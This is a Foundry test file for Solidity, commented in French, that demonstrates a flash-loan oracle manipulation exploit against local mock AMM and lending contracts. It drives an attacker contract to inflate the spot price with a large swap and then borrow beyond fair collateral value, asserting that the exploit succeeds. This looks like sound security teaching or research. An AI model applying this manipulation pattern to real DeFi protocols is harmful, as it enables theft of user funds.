// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {SimpleAMM} from "../src/SimpleAMM.sol";
import {LendingProtocol} from "../src/LendingProtocol.sol";
import {FlashLoanAttacker} from "../src/FlashLoanAttacker.sol";

contract FlashLoanOracleTest is Test {

    SimpleAMM        public amm;
    LendingProtocol  public lending;
    FlashLoanAttacker public attacker;

    address public victim   = makeAddr("victim");
    address public attackerAddr = makeAddr("attacker");

    // Pool initialisé avec 1000 A et 1000 B → prix initial = 1:1
    uint256 constant INIT_A = 1000 ether;
    uint256 constant INIT_B = 1000 ether;

    function setUp() public {
        // Déploie le pool AMM
        amm     = new SimpleAMM(INIT_A, INIT_B);
        lending = new LendingProtocol(address(amm));

        // Déploie l'attaquant
        vm.prank(attackerAddr);
        attacker = new FlashLoanAttacker(address(amm), address(lending));

        // Donne des tokens aux participants
        amm.deal(victim,              500 ether,  500 ether);
        amm.deal(address(attacker),   100 ether, 800 ether);
    }

    // ── PRIX INITIAL ─────────────────────────────────────
    function test_initialPrice() public {
        uint256 price = amm.getSpotPrice();
        // 1000B / 1000A * 1e18 = 1e18 (1:1)
        assertEq(price, 1e18, "Initial price should be 1:1");
        emit log_named_decimal_uint("Initial spot price (B per A)", price, 18);
    }

    // ── MANIPULATION DE PRIX ─────────────────────────────
    function test_priceManipulation() public {
        uint256 priceBefore = amm.getSpotPrice();
        emit log_named_decimal_uint("Price before swap ", priceBefore, 18);

        // Swap massif B→A : injecte 800 B dans le pool
        // reserveB monte, reserveA descend → prix de A en B monte
        vm.prank(address(attacker));
        amm.swapBtoA(800 ether);

        uint256 priceAfter = amm.getSpotPrice();
        emit log_named_decimal_uint("Price after swap  ", priceAfter, 18);

        // Le prix de A doit avoir significativement augmenté
        assertGt(priceAfter, priceBefore * 2, "Price should at least double");
    }

    // ── EXPLOIT COMPLET ───────────────────────────────────
    function test_flashLoanOracleExploit() public {
        uint256 priceBefore = amm.getSpotPrice();

        emit log_string("\n=== FLASH LOAN ORACLE ATTACK ===");
        emit log_named_decimal_uint("Price A before    ", priceBefore, 18);
        emit log_named_decimal_uint("Attacker A before ", amm.balanceA(address(attacker)), 18);
        emit log_named_decimal_uint("Attacker B before ", amm.balanceB(address(attacker)), 18);

        // Lance l'attaque :
        // 1. Swap 800B → A pour manipuler le prix à la hausse
        // 2. Dépose 50 A comme collateral
        // 3. Emprunte B au prix manipulé → emprunte plus que la valeur réelle
        vm.prank(attackerAddr);
        attacker.attack(0, 50 ether);

        uint256 priceAfter    = amm.getSpotPrice();
        uint256 debtIncurred  = lending.debt(address(attacker));

        emit log_named_decimal_uint("Price A after     ", priceAfter, 18);
        emit log_named_decimal_uint("Debt incurred (B) ", debtIncurred, 18);

        // L'attaquant a emprunté plus que ce que le collateral vaut réellement
        // au prix initial (50 A * 1 B/A * 100/150 = 33 B max au prix normal)
        // Avec manipulation, il peut emprunter beaucoup plus
        uint256 collat = 50 ether;
        uint256 fairMaxBorrow = (collat * 100) / 150;
        emit log_named_decimal_uint("Fair max borrow   ", fairMaxBorrow, 18);

        assertGt(debtIncurred, fairMaxBorrow, "Should have borrowed more than fair value");
        emit log_string("=== EXPLOIT SUCCESS ===\n");
    }

    // ── FUZZ : le prix ne doit jamais dépasser les réserves ──
    function testFuzz_spotPriceConsistency(
        uint96 swapAmount
    ) public {
        vm.assume(swapAmount >= 1 ether);   // seuil minimum viable
        vm.assume(swapAmount < 900 ether);

        address fuzzer = makeAddr("fuzzer");
        amm.deal(fuzzer, 0, swapAmount);

        vm.prank(fuzzer);
        amm.swapBtoA(swapAmount);

        uint256 price = amm.getSpotPrice();

        assertGt(price, 0, "Price must be positive");
        assertEq(
            price,
            (amm.reserveB() * 1e18) / amm.reserveA(),
            "Price must match reserves"
        );
    }
}